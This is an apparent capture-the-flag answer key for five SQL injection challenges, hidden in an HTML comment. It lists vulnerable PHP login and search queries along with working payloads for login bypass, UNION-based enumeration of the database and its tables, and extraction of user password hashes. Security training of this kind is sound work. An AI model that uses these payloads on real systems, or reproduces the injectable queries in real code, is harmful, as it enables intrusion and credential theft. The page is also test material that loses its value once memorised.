# WEB - SQLi Challenges

## Website down for maintenance.
<!---
# Challenge 1 - Try to login
	+ main file used = login1.php
	+ solution: anything' OR 1=1 -- //
	+ note: the query was of the form:
	$q = "SELECT * FROM users where username='".$username."' AND password = '".md5($pass)."'" ;


# Challenge 2 - Try logging in... again
	+ main file used = login2.php
	+ solution = blah') OR 1=1 -- //
	+ note: the query was of the form:
	$q = "SELECT * FROM users where (username='".$username."') AND (password = '".md5($pass)."')" ;

# Challenge 3 - Get the database name
	+ hint: Try to figure out the DB software being used. Find out how to get database details with that software
	+ main file used = searchproducts.php
	+ solution = ' union select null, null, database(), null, null -- //
	+ approach = keep trying 
		+ ' union select 1 -- //
		+ ' union select 1, 2 -- //
		+ and so on until you get an error
		+ you will then figure out the number of columns
		+ by the comment style, you should've figured out the DB software being used - viz MySQL in this case 
		+ google how to obtain DB name on MySQL through SQLi, you will come across the database() function.

# Challenge 4 - Find the table names
	+ main file used = searchproducts.php
	+ solution = ' union select null, table_name, null, null, null from information_schema.columns where table_schema=database() -- //
	+ same approach as challenge 3

# Challenge 5 - Find the password of the 5th person in md5.
	+ main file used = searchproducts.php
	+ solution = ' union select null, id, username, password, fname from users -- //
	+ approach
		+ you would've obtained the table names from the previous challenge 
		+ ' UNION SELECT column_name, null, null, null, null FROM information_schema.columns -- // will help you get the column names
		+ then execute the query stated in 'solution' and extract the password of the person corresponding to id = 5
--->
